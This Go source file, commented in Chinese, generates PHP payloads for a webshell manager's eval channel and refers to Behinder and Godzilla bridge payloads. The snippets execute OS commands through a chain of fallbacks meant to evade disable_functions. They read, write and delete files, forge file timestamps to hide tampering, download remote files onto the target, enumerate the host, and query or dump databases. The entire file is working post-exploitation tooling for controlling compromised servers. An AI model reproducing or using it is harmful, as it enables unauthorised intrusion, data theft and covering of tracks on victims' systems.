// PHP 代码片段库:eval 能力通道(cmd-eval / dsh-aes v2 e 操作码 / 冰蝎与哥斯拉
// 桥接载荷)专用。片段自包含、参数走 base64 内嵌(规避引号/反斜杠/$ 转义地狱),
// 结构化输出统一带 WSMJSON 前缀标记,二进制读带 WSMB64 前缀标记。
package webshellproto

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// pParam 参数 → PHP base64_decode('…') 字面量。
func pParam(v string) string {
	return "base64_decode('" + base64.StdEncoding.EncodeToString([]byte(v)) + "')"
}

// snippetPrelude 共用前奏:shell 执行多函数回退(disable_functions 对抗的最低保障)。
const snippetPrelude = `
function __wsm_sh($c){
  $o = null;
  if (function_exists('shell_exec')) { $o = @shell_exec($c); }
  elseif (function_exists('exec')) { $r = array(); @exec($c . ' 2>&1', $r); $o = implode("\n", $r); }
  elseif (function_exists('popen')) { $h = @popen($c . ' 2>&1', 'r'); $o = $h ? @stream_get_contents($h) : null; if ($h) @pclose($h); }
  elseif (function_exists('system')) { ob_start(); @system($c . ' 2>&1'); $o = ob_get_clean(); }
  elseif (function_exists('passthru')) { ob_start(); @passthru($c . ' 2>&1'); $o = ob_get_clean(); }
  return ($o === false || $o === null) ? '' : (string)$o;
}
function __wsm_rm($p){
  if (is_dir($p)) { foreach (scandir($p) as $f) { if ($f !== '.' && $f !== '..') __wsm_rm($p . DIRECTORY_SEPARATOR . $f); } @rmdir($p); }
  else { @unlink($p); }
}
function __wsm_out($j){ echo 'WSMJSON' . $j; }
`

// SnippetLs 目录列表 → JSON [{n,d,s,m,w,p}]。
func SnippetLs(path string) string {
	return snippetPrelude + `
$d = ` + pParam(path) + `;
$o = array();
if (!is_dir($d)) { __wsm_out(json_encode(array('error' => 'not a dir'))); return; }
foreach (scandir($d) as $f) {
  if ($f === '.' || $f === '..') continue;
  $fp = $d . DIRECTORY_SEPARATOR . $f;
  $o[] = array('n' => $f, 'd' => @is_dir($fp), 's' => @is_file($fp) ? @filesize($fp) : 0,
    'm' => @filemtime($fp), 'w' => @is_writable($fp),
    'p' => substr(sprintf('%o', @fileperms($fp)), -4));
}
usort($o, function($a, $b){ return strcmp($a['n'], $b['n']); });
__wsm_out(json_encode($o));
`
}

// SnippetRead 读文件 → WSMB64 + base64(不存在 → WSMJSON error)。
func SnippetRead(path string) string {
	return snippetPrelude + `
$p = ` + pParam(path) + `;
if (!@file_exists($p)) { __wsm_out(json_encode(array('error' => 'file not found'))); return; }
$c = @file_get_contents($p);
echo 'WSMB64' . base64_encode($c === false ? '' : $c);
`
}

// SnippetCopy 复制文件。
func SnippetCopy(from, to string) string {
	return `
$ok = @copy(` + pParam(from) + `, ` + pParam(to) + `);
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`
}

// SnippetWrite 写文件(首块)。
func SnippetWrite(path, dataB64 string) string {
	return snippetPrelude + `
$ok = @file_put_contents(` + pParam(path) + `, base64_decode(` + pParam(dataB64) + `));
__wsm_out(json_encode(array('ok' => $ok !== false)));
`
}

// SnippetAppend 追加写(后续块)。
func SnippetAppend(path, dataB64 string) string {
	return snippetPrelude + `
$ok = @file_put_contents(` + pParam(path) + `, base64_decode(` + pParam(dataB64) + `), FILE_APPEND);
__wsm_out(json_encode(array('ok' => $ok !== false)));
`
}

// SnippetDelete 删除文件/目录(递归)。
func SnippetDelete(path string) string {
	return snippetPrelude + `
__wsm_rm(` + pParam(path) + `);
__wsm_out(json_encode(array('ok' => !file_exists(` + pParam(path) + `))));
`
}

// SnippetMkdir 新建目录(递归)。
func SnippetMkdir(path string) string {
	return snippetPrelude + `
$ok = @mkdir(` + pParam(path) + `, 0755, true);
__wsm_out(json_encode(array('ok' => $ok || is_dir(` + pParam(path) + `))));
`
}

// SnippetMv 重命名/移动(跨设备回退 copy+rm)。
func SnippetMv(from, to string) string {
	return snippetPrelude + `
$a = ` + pParam(from) + `; $b = ` + pParam(to) + `;
$ok = @rename($a, $b);
if (!$ok && @copy($a, $b)) { @unlink($a); $ok = true; }
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`
}

// SnippetChmod 改权限(八进制字符串)。
func SnippetChmod(path, mode string) string {
	clean := ""
	for _, c := range mode {
		if c >= '0' && c <= '7' {
			clean += string(c)
		}
	}
	if clean == "" {
		clean = "644"
	}
	return snippetPrelude + `
__wsm_out(json_encode(array('ok' => @chmod(` + pParam(path) + `, octdec(` + pParam(clean) + `)))));
`
}

// SnippetTouch 伪造时间戳(epoch 秒,mtime+atime 同设)。
func SnippetTouch(path string, epoch int64) string {
	return snippetPrelude + fmt.Sprintf("\n$t = %d;\n", epoch) + `__wsm_out(json_encode(array('ok' => @touch(` + pParam(path) + `, $t, $t))));
`
}

// SnippetStat 读时间戳与大小。
func SnippetStat(path string) string {
	return snippetPrelude + `
$s = @stat(` + pParam(path) + `);
__wsm_out($s ? json_encode(array('size' => $s['size'], 'mtime' => $s['mtime'], 'atime' => $s['atime'], 'ctime' => $s['ctime'], 'perm' => substr(sprintf('%o', $s['mode']), -4))) : json_encode(array('error' => 'stat failed')));
`
}

// SnippetWget 远程 URL 下载到目标机。
func SnippetWget(rawURL, path string) string {
	return snippetPrelude + `
$ctx = stream_context_create(array('http' => array('timeout' => 25, 'follow_location' => 1)));
$c = @file_get_contents(` + pParam(rawURL) + `, false, $ctx);
$ok = $c !== false && @file_put_contents(` + pParam(path) + `, $c) !== false;
__wsm_out(json_encode(array('ok' => (bool)$ok)));
`
}

// SnippetHash 文件 MD5(上传完整性核对)。
func SnippetHash(path string) string {
	return snippetPrelude + `
$h = @md5_file(` + pParam(path) + `);
__wsm_out(json_encode(array('md5' => $h === false ? '' : $h)));
`
}

// SnippetBasicInfo 基本信息 → JSON。
func SnippetBasicInfo() string {
	return snippetPrelude + `
$u = __wsm_sh(PHP_OS_FAMILY === 'Windows' ? 'whoami' : 'id -un');
__wsm_out(json_encode(array(
  'user' => trim($u), 'os' => PHP_OS, 'osFamily' => PHP_OS_FAMILY, 'uname' => php_uname(),
  'cwd' => getcwd(), 'php' => PHP_VERSION, 'sapi' => php_sapi_name(),
  'disabled' => (string)ini_get('disable_functions'), 'tz' => @date_default_timezone_get()
)));
`
}

// SnippetRoots 盘符/根。
func SnippetRoots() string {
	return snippetPrelude + `
$r = array();
if (PHP_OS_FAMILY === 'Windows') {
  foreach (range('A', 'Z') as $L) { $p = $L . ':\\'; if (@is_dir($p)) $r[] = $p; }
} else { $r[] = '/'; }
__wsm_out(json_encode($r));
`
}

// SnippetExec OS 命令执行(eval 通道的 cmd 底座)。
func SnippetExec(command string) string {
	return snippetPrelude + `
echo __wsm_sh(` + pParam(command) + `);
`
}

// pdoConnect PDO 连接构造(类型:mysql/pgsql/sqlite/mssql)。
const pdoConnect = `
function __wsm_db($t, $h, $P, $u, $w, $db){
  $opts = array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_TIMEOUT => 15);
  if ($t === 'mysql') { $dsn = "mysql:host=$h;port=$P" . ($db ? ";dbname=$db" : '') . ";charset=utf8mb4"; return new PDO($dsn, $u, $w, $opts); }
  if ($t === 'pgsql') { $dsn = "pgsql:host=$h;port=$P" . ($db ? ";dbname=$db" : ''); return new PDO($dsn, $u, $w, $opts); }
  if ($t === 'sqlite') { return new PDO('sqlite:' . $db, null, null, $opts); }
  if ($t === 'mssql') { $dsn = strpos($h, "\\") !== false ? "sqlsrv:Server=$h" : "sqlsrv:Server=$h,$P" . ($db ? ";Database=$db" : ''); return new PDO($dsn, $u, $w, $opts); }
  throw new Exception("unsupported type $t");
}
`

// DBProfile 是一套数据库连接档案。
type DBProfile struct {
	Type     string `json:"type"`
	Host     string `json:"host"`
	Port     string `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Database string `json:"database"`
}

// SnippetDbQuery 执行 SQL → {cols,rows,affected,truncated}。
func SnippetDbQuery(profile DBProfile, sql string) string {
	return snippetPrelude + pdoConnect + `
try {
  $pdo = __wsm_db(` + pParam(profile.Type) + `, ` + pParam(profile.Host) + `, ` + pParam(profile.Port) + `, ` + pParam(profile.Username) + `, ` + pParam(profile.Password) + `, ` + pParam(profile.Database) + `);
  $st = $pdo->query(` + pParam(sql) + `);
  if ($st && $st->columnCount() > 0) {
    $cols = array(); for ($i = 0; $i < $st->columnCount(); $i++) { $m = $st->getColumnMeta($i); $cols[] = $m ? $m['name'] : "c$i"; }
    $rows = array(); $n = 0;
    while (($r = $st->fetch(PDO::FETCH_NUM)) !== false && $n < 201) { $rows[] = array_map(function($v){ return $v === null ? null : (string)$v; }, $r); $n++; }
    __wsm_out(json_encode(array('cols' => $cols, 'rows' => $rows, 'truncated' => $n >= 201)));
  } else {
    __wsm_out(json_encode(array('cols' => array(), 'rows' => array(), 'affected' => $st ? $st->rowCount() : $pdo->exec(` + pParam(sql) + `))));
  }
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`
}

// SnippetDbDatabases 库列表。
func SnippetDbDatabases(profile DBProfile) string {
	sql := ""
	switch profile.Type {
	case "mysql":
		sql = "SHOW DATABASES"
	case "pgsql":
		sql = "SELECT datname FROM pg_database WHERE NOT datistemplate ORDER BY 1"
	case "mssql":
		sql = "SELECT name FROM sys.databases ORDER BY name"
	}
	if sql == "" {
		return snippetPrelude + pdoConnect + "\n__wsm_out(json_encode(array('databases' => array('(current)'))));\n"
	}
	return snippetPrelude + pdoConnect + `
try {
  $pdo = __wsm_db(` + pParam(profile.Type) + `, ` + pParam(profile.Host) + `, ` + pParam(profile.Port) + `, ` + pParam(profile.Username) + `, ` + pParam(profile.Password) + `, ` + pParam(profile.Database) + `);
  $rows = $pdo->query(` + pParam(sql) + `)->fetchAll(PDO::FETCH_COLUMN);
  __wsm_out(json_encode(array('databases' => $rows)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`
}

// SnippetDbTables 表列表(指定库)。
func SnippetDbTables(profile DBProfile, database string) string {
	var sql string
	switch profile.Type {
	case "mysql":
		sql = "SHOW TABLES FROM `" + strings.ReplaceAll(database, "`", "``") + "`"
	case "pgsql":
		sql = "SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY 1"
	case "mssql":
		sql = "SELECT name FROM sys.tables ORDER BY name"
	default:
		sql = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
	}
	dbName := profile.Database
	if profile.Type == "mysql" && database != "" {
		dbName = database
	}
	return snippetPrelude + pdoConnect + `
try {
  $pdo = __wsm_db(` + pParam(profile.Type) + `, ` + pParam(profile.Host) + `, ` + pParam(profile.Port) + `, ` + pParam(profile.Username) + `, ` + pParam(profile.Password) + `, ` + pParam(dbName) + `);
  $rows = $pdo->query(` + pParam(sql) + `)->fetchAll(PDO::FETCH_COLUMN);
  __wsm_out(json_encode(array('tables' => $rows)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`
}

// SnippetDbTableInfo 表结构(列名+类型)与行数。
func SnippetDbTableInfo(profile DBProfile, database, table string) string {
	q := strings.ReplaceAll(table, "'", "''")
	isSqlite := profile.Type == "sqlite"
	var sql string
	switch profile.Type {
	case "mysql":
		sql = "SELECT column_name, data_type FROM information_schema.columns WHERE table_schema=database() AND table_name='" + q + "' ORDER BY ordinal_position"
	case "pgsql":
		sql = "SELECT column_name, data_type FROM information_schema.columns WHERE table_name='" + q + "' ORDER BY ordinal_position"
	case "mssql":
		sql = "SELECT c.name, t.name FROM sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('" + q + "') ORDER BY c.column_id"
	default:
		sql = "PRAGMA table_info('" + q + "')"
	}
	dbName := profile.Database
	if profile.Type == "mysql" && database != "" {
		dbName = database
	}
	fetch := "while ($r = $st->fetch(PDO::FETCH_NUM)) { $cols[] = array($r[0], $r[1]); }"
	if isSqlite {
		fetch = "while ($r = $st->fetch(PDO::FETCH_NUM)) { $cols[] = array($r[1], $r[2]); }"
	}
	return snippetPrelude + pdoConnect + `
try {
  $pdo = __wsm_db(` + pParam(profile.Type) + `, ` + pParam(profile.Host) + `, ` + pParam(profile.Port) + `, ` + pParam(profile.Username) + `, ` + pParam(profile.Password) + `, ` + pParam(dbName) + `);
  $st = $pdo->query(` + pParam(sql) + `);
  $cols = array();
  ` + fetch + `
  try { $n = $pdo->query('SELECT COUNT(*) FROM "' . str_replace('"', '""', ` + pParam(table) + `) . '"')->fetch(PDO::FETCH_COLUMN); } catch (Throwable $e2) { $n = null; }
  __wsm_out(json_encode(array('columns' => $cols, 'count' => $n)));
} catch (Throwable $e) { __wsm_out(json_encode(array('error' => $e->getMessage()))); }
`
}

// SnippetResult 是片段结构化结果的宽松形态(各片段字段不一,统一装)。
type SnippetResult struct {
	// WSMJSON 解析对象(任意片段字段);WSMB64 → B64Buffer
	Raw       map[string]any `json:"-"`
	RawList   []any          `json:"-"`
	B64Buffer string         `json:"-"`
	Text      string         `json:"-"`
	IsList    bool           `json:"-"`
}

// Get 取字段。
func (r *SnippetResult) Get(key string) any {
	if r == nil {
		return nil
	}
	return r.Raw[key]
}

// Error 取片段错误信息(无则空)。
func (r *SnippetResult) Error() string {
	if r == nil {
		return ""
	}
	if e, ok := r.Raw["error"].(string); ok {
		return e
	}
	return ""
}

// ExtractMarked 从 eval 通道输出中提取结构化结果:
// WSMJSON → 解析对象/数组;WSMB64 → Buffer;否则原文本。
func ExtractMarked(text string) *SnippetResult {
	res := &SnippetResult{}
	i := strings.Index(text, "WSMJSON")
	if i >= 0 {
		payload := strings.TrimSpace(text[i+len("WSMJSON"):])
		if err := json.Unmarshal([]byte(payload), &res.RawList); err == nil {
			res.IsList = true
			return res
		}
		if err := json.Unmarshal([]byte(payload), &res.Raw); err == nil && res.Raw != nil {
			return res
		}
		// 标记后非完整 JSON → 按原文返回
	}
	j := strings.Index(text, "WSMB64")
	if j >= 0 {
		res.B64Buffer = strings.TrimSpace(text[j+len("WSMB64"):])
		return res
	}
	res.Text = text
	return res
}
